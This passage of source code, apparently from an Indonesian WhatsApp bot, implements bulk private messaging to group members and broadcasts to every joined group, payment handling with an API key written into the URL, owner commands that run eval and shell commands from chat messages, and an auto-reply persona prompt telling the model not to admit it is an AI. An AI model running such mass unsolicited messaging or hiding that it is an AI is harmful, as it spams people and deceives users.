case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: `${prefix}buypanel`
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: `${prefix}buyadp`
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: `${prefix}buyvps`
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: `${prefix}buysc`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

case "depo": case "deposit": {
if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan di private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
*#- Masukkan nominal deposit yang ingin dilakukan*
Contoh penggunaan: *.depo* 5000
`
if (!text) return m.reply(teks)

let amount = Number(text)
if (isNaN(amount) || amount <= 0) return m.reply("Nominal yang dimasukkan tidak valid. Harap masukkan jumlah yang benar.")
const UrlQr = global.qrisOrderKuota
const adjustedAmount = amount + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`

let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`, 
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000) 
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

*• ID :* ${db.users[m.sender].saweria.transactionId}
*• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
*• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
}
}
}
//-# Saweria Login
case 'login': {
    if (m.isGroup) return m.reply(mess.group)
    if (!isOwner) return Reply(mess.owner)
    
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        
        if (!Array.isArray(db_saweria)) {
            db_saweria = [];
        }
    } catch (error) {

        db_saweria = [];
    }


    if (db_saweria.length >= 1) {
        return m.reply(`Sudah login di saweria...`);
    }


    if (!q) return m.reply(`Contoh: ${prefix+command} email@gmail.com,password`);
    
    const parts = q.split(',');
    if (parts.length !== 2) return m.reply(`Contoh: ${prefix+command} email@gmail.com,password`);
    
    const email = parts[0].trim();
    const password = parts[1].trim();


    if (!email.includes('@') || !email.includes('.')) {
        return m.reply(`Format email tidak valid. Contoh: ${prefix+command} email@gmail.com,password`);
    }

    try {
        await m.reply("Sedang mencoba login...");
        let Pay = new Saweria(db_saweria);
        let res = await Pay.login(email, password);
        
        if (!res.status) {
            return m.reply(`Terjadi kesalahan saat login:\n${res.msg}`);
        }

        await sleep(500);
        await m.reply(`*LOGIN SUKSES ✅*\n\n*USER ID:* ${res.data.user_id}`);
        
        
        db_saweria.push(res.data.user_id);
        
        fs.writeFileSync("./source/saweria.json", JSON.stringify(db_saweria, null, 2), 'utf8');
    } catch (error) {
        console.error('Login error:', error);
        return m.reply('Terjadi kesalahan saat login. Silakan coba lagi.');
    }
}
    break
    
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: `${prefix}dana`
                },
                {
                  title: 'OVO',
                  id: `${prefix}ovo`
                },                
                {
                  title: 'GOPAY',
                  id: `${prefix}gopay`
                },
                {
                  title: 'SHOPEEPAY',
                  id: `${prefix}shopepay`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti transfer !!```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await conn.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await conn.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© 𝖯𝗈𝗐𝖾𝗋𝖾𝖽 𝖡𝗒 ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© 𝖯𝗈𝗐𝖾𝗋𝖾𝖽 𝖡𝗒 ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "public": {
    if (!isCreator) return

    conn.public = true
    

    const dir = "./library/database";
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    
    
    const modeFilePath = require('path').resolve(dir, "mode.json");
    fs.writeFileSync(modeFilePath, JSON.stringify({ public: true }, null, 2), 'utf8');
    

    if (fs.existsSync(modeFilePath)) {
        console.log(`Mode saved successfully at ${modeFilePath}`);
        m.reply("Berhasil mengganti ke mode *public*");
    } else {
        m.reply("Gagal menyimpan mode!");
    }
}
break

case "self": {
    if (!isCreator) return
    
    conn.public = false
    

    const dir = "./library/database";
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
   
    const modeFilePath = require('path').resolve(dir, "mode.json");
    fs.writeFileSync(modeFilePath, JSON.stringify({ public: false }, null, 2), 'utf8');
    
    if (fs.existsSync(modeFilePath)) {
        console.log(`Mode saved successfully at ${modeFilePath}`);
        m.reply("Berhasil mengganti ke mode *self*");
    } else {
        m.reply("Gagal menyimpan mode!");
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "getcase": {
    if (!isCreator) return conn.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
    if (!text) return conn.sendMessage(m.chat, { text: 'Contoh: .getcase menu' }, { quoted: m });
    
    const getcase = (cases) => {
        const fileContent = fs.readFileSync('./icvxii.js').toString();
        
        let casePattern1 = `case "${cases}"`;
        let casePattern2 = `case '${cases}'`;
        
        let startIndex = -1;
        let caseDeclaration = '';
       
        if (fileContent.includes(casePattern1)) {
            startIndex = fileContent.indexOf(casePattern1);
            caseDeclaration = casePattern1;
        } else if (fileContent.includes(casePattern2)) {
            startIndex = fileContent.indexOf(casePattern2);
            caseDeclaration = casePattern2;
        } else {
            throw new Error("Case not found");
        }
        if (startIndex === -1) throw new Error("Case not found");
        const caseContent = fileContent.substring(startIndex);
        const breakIndex = caseContent.indexOf("break");
        
        if (breakIndex === -1) throw new Error("Invalid case format: no break statement found");
        const completeCase = caseContent.substring(0, breakIndex + 5);
        return completeCase;
    }
    try {
        const result = getcase(text);
        conn.sendMessage(m.chat, { text: result }, { quoted: m });
    } catch (e) {
        conn.sendMessage(m.chat, { text: `Case *${text}* tidak ditemukan` }, { quoted: m });
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 sungsu server info*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 sungsu information*

*• sungsu Speed :* ${latensi.toFixed(4)} seconds
*• sungsu Runtime :* ${runtime(process.uptime())}

> Done by sungsu-cpanel`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": case "restartbot": {
  if (!isCreator) return Reply(mess.owner)
  await m.reply("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await m.reply("Restarting bot...")
  process.exit(0)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await conn.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `BotzV1`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

case "sendsc": {
  if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
  
  if (!args[0]) return Reply(`Example: sendsc 6285776461481\n\nNote:\nTidak boleh nomer +62xx,08xx`)
  
  let targetNumber = args[0]
  if (!targetNumber.startsWith('62')) return Reply(`Format nomor salah! Gunakan format 62xxx\n\nExample: sendsc 6285776461481`)
  
  await m.reply("Memproses pengiriman script bot")
  var name = `BotzV1`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await conn.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: m})
  
  await execSync(`rm -rf ${name}.zip`)
  
  return m.reply(`Script bot berhasil dikirim ke nomor ${targetNumber}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "setppbot": case "setpp": {
  if (!isCreator) return Reply(mess.owner)
  if (!quoted) return m.reply('Reply Image')
  if (!/image/.test(mime)) return m.reply('Reply Image With Caption')
  if (/webp/.test(mime)) return m.reply('Reply Image Not Sticker')
  
  try {
    let media = await conn.downloadAndSaveMediaMessage(quoted)
    if (args[0] && args[0] == "panjang") {
      try {
        const { img } = await generateProfilePicture(media)
        await conn.query({
          tag: 'iq',
          attrs: {
            to: botNumber,
            type: 'set',
            xmlns: 'w:profile:picture'
          },
          content: [
            {
              tag: 'picture',
              attrs: { type: 'image' },
              content: img
            }
          ]
        })
        fs.unlinkSync(media)
        m.reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        m.reply("Terjadi kesalahan saat mengatur foto profil panjang")
      }
    } else {
      try {
        await conn.updateProfilePicture(botNumber, { url: media })
        fs.unlinkSync(media)
        m.reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        m.reply("Terjadi kesalahan saat mengatur foto profil")
      }
    }
  } catch (e) {
    console.log(e)
    m.reply(`${e}`)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

case "autoai": {
    if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

    if (text === "on") {
        globalAutoAIStatus = true;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
    } else if (text === "off") {
        globalAutoAIStatus = false;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
    } else if (text === "reset") {
        if (globalAutoAIStatus) {
            sessions = {};
            saveSession();
            return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
        } else {
            return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
        }
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply(`${global.botname} ✅`)
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (globalAutoAIStatus) {
    if (m.isBaileys && m.fromMe) return;
  
    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const d = new Date();
    d.setTime(d.getTime() + 3600000);
    const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' });
    const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss');
    const namePengguna = conn.getName(m.sender);

    const prompt = `
    Halo ${namePengguna} 👋, perkenalkan nama saya . Namamu pasti ${namePengguna}, bukan? ✨ Hari ini adalah ${hariini}, pukul ${jam} waktu WIB. Nama kamu adalah , AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main :* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };
        
        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);
        
        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();
        
        return conn.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
    } catch (err) {
        console.error(err);
        return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}
//=============================//
}
} catch (err) {
  console.log(util.format(err));
  let Obj = global.owner
  conn.sendMessage(Obj + "@s.whatsapp.net", {
    text: `*Hallo developer, telah terjadi error pada command :* ${m.body?.startsWith(' ') ? m.body.split(' ')[0] : m.text}\n *Detail informasi error :* ${util.format(err)}\n\n> Note : Jika tidak tau artinya ketik translate id TEXT`,
    contextInfo: { isForwarded: true }
  }, { quoted: m })
}}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
